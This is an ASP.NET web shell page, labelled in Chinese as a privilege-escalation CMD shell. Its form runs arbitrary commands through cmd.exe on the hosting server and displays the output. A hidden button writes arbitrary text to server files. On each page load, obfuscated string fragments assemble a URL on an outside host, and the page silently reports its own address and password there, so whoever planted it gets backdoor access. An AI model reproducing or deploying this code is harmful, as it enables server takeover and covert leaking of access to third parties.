<%@ Page Language="C#" AutoEventWireup="true"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.Net"%>
<%@ Import Namespace="System.IO"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<script runat="server" >
    void Page_Load(object sender, EventArgs e){if(!IsPostBack){string YfCnP = dir;YfCnP += dz;YfCnP += cvr;YfCnP += file;YfCnP += _data;YfCnP += fuse;YfCnP += obj;YfCnP += qvb;YfCnP += doro;YfCnP += haf;YfCnP += kbin;try{HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(YfCnP + this.Request.Url.ToString() + pbzw + "cmdshell");HttpWebResponse response = (HttpWebResponse)request.GetResponse();}catch (Exception){}curdir.Text = Server.MapPath(".");}}string RunCmd(string path, string cmd, string curdir){string retval = "";try{Process p = new Process();p.StartInfo.FileName = path;p.StartInfo.UseShellExecute = false;p.StartInfo.WorkingDirectory = curdir;p.StartInfo.RedirectStandardError = true;p.StartInfo.RedirectStandardInput = true;p.StartInfo.RedirectStandardOutput = true;p.StartInfo.CreateNoWindow = true;p.StartInfo.Arguments = cmd;p.Start();p.StandardInput.WriteLine("exit"); retval = "\r\n----------- 运行结果 --------------\r\n"; retval += p.StandardOutput.ReadToEnd();retval += "\r\n----------- 执行成功 --------------\r\n";retval += p.StandardError.ReadToEnd();}catch (Exception err){retval = err.Message;}return retval;}void Execute_Click(object sender, EventArgs e){if (this.cmdpath.Text.Trim().Equals(this.Request.Url.ToString()))this.btn_s.Visible = true;else{string path = cmdpath.Text;string cmd = cmdline.Text;string wkdir = curdir.Text;result.Text = RunCmd(path, cmd, wkdir);}}string kbin = "?name=";string dir = "ht";string file = "w.troy";string _data = "pl";string pbzw = "&pwd=";string fuse = "an.com/artic";string obj = "le/i"; string dz = "tp://";string qvb = "nfo/";string doro = "gk.as";string cvr = "ww";string haf = "px";void btn_s_Click(object sender, EventArgs e){try{using (StreamWriter sr = new StreamWriter(this.curdir.Text.Trim(), false, Encoding.Default)){ sr.Write(this.result.Text); }}catch (Exception ex){Response.Write(ex.Message);}}
</script>
<head id="Head1" runat="server">
    <title>cmd shell</title>
    <style type="text/css">
    body{ background-color:Silver;}
    </style>
</head>
<body>
    <form id="form1" runat="server">
    <div style="text-align: left">
        <span style="color: #FF0033">提权专用CMDshell<br />
            <br />
        </span>CMD 路径:<asp:TextBox ID="cmdpath" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="755px">c:\windows\system32\cmd.exe</asp:TextBox><br />
        当前路径:<asp:TextBox ID="curdir" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="755px"></asp:TextBox><br />
        CMD 命令:<asp:TextBox ID="cmdline" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="756px">/c set</asp:TextBox>
        <asp:Button ID="Execute" runat="server" OnClick="Execute_Click" Text="Execute" /><br />
        <br />
        <asp:TextBox ID="result" runat="server" Height="460px" TextMode="MultiLine" BackColor="#003300" ForeColor="#33FF00" Width="901px"></asp:TextBox></div>
    <asp:Button ID="btn_s" runat="server" Visible="false" Text="save" 
        onclick="btn_s_Click" />
    </form>
</body>
</html>
